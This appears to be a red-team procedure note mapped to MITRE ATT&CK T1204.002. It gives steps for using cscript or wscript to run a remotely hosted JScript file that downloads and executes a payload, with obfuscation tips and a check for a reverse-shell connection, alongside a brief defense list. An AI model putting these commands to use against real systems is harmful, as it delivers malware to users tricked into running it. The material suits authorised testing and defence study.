---
type: procedure
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/User Execution|T1204 - User Execution]]'
sub_techniques:
  - '[[sub-techniques/Malicious File|T1204.002 - Malicious File]]'
tags:
  - cscript
  - wscript
  - jscript
  - execution
  - windows-download-execute
platforms:
  - Windows
commands:
  - '[[commands/cscript-execute-jscript-payload]]'
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# windows-cscript-wscript-jscript-payload-execution

## Summary

This procedure demonstrates how to execute a JScript payload on a Windows system using Cscript or Wscript, Windows Script Host tools, to download and run remote code. The JScript script can fetch an executable from a remote server (e.g., via HTTP or WebDAV) and execute it, often with obfuscation to bypass detection. This technique is commonly used for initial access or code execution in red team engagements.

## Description

Cscript and Wscript are built-in Windows components for running scripts in console or GUI modes, respectively. JScript, Microsoft's dialect of JavaScript, allows attackers to create scripts that perform network requests using ActiveX objects like XMLHTTP to download payloads. Once downloaded, the script can invoke WScript.Shell to execute the file. Obfuscation techniques, such as variable renaming or encoding, can be applied to the JScript to evade antivirus scanning. This method requires user interaction to run the script but is effective in phishing or social engineering scenarios targeting Windows environments. It maps to MITRE ATT&CK for user-executed malicious files leading to arbitrary code execution.

## Requirements

1. Administrative or user-level access to a Windows system with Windows Script Host enabled (default on Windows 7+).
2. A remote server (e.g., WebDAV share or HTTP host) to serve the JScript file and the target payload (e.g., .exe).
3. Network connectivity from the target to the remote server.
4. Optional: Tools for obfuscating the JScript code to reduce detection.

## Defense

- Enable Windows Defender or endpoint protection with script scanning enabled to detect malicious JScript.
- Disable or restrict WScript/Cscript execution via Group Policy (e.g., 'Turn off Windows Script Host').
- Monitor PowerShell and command-line logging for invocations of cscript/wscript with remote paths.
- Implement network controls to block unauthorized downloads from external servers.

## Objectives

1. Download a payload from a remote location using JScript.
2. Execute the downloaded payload on the target Windows system.
3. Establish initial code execution for further post-exploitation.

## Instructions

### Step 1: Prepare the JScript Payload

**Context**: Create or host a JScript file that downloads and executes the target payload. Use the sample code [[codes/jscript-download-execute-remote-payload]] to build this. Save it as payload.js on your remote server (e.g., WebDAV share at \\webdavserver\folder\payload.js). Obfuscate if needed by renaming variables or using hex encoding.

**Expected Output**: A hosted .js file accessible via UNC or HTTP path.

### Step 2: Verify Remote Accessibility

**Context**: Ensure the target can reach the JScript file. Test connectivity to the remote server from the target environment.

**Command** ([[commands/cscript-execute-jscript-payload]]):
```cmd
cscript //E:jscript //NoLogo $_REMOTE_PATH
```

> Use a test path first to confirm the script loads without errors. Replace $_REMOTE_PATH with the UNC or HTTP path to a benign test script.

**Expected Output**: No errors; script runs silently if no payload execution.

### Step 3: Execute the JScript Payload

**Context**: Run the JScript via Cscript from a command prompt or PowerShell on the target. This triggers the download and execution of the remote payload.

**Command** ([[commands/cscript-execute-jscript-payload]]):
```cmd
cscript //E:jscript $_REMOTE_PATH
```

> The //E:jscript flag specifies the JScript engine. For GUI mode, use wscript instead of cscript. The script will fetch the payload (e.g., .exe) to a temp location and run it hidden.

**Expected Output**: Payload downloads (visible in network traffic) and executes without console output if configured for stealth.

### Step 4: Verify Execution

**Context**: Check for signs of successful payload run, such as a reverse shell connection or process creation.

**Expected Output**: Attacker listener receives connection, or tasklist shows new process from the payload.
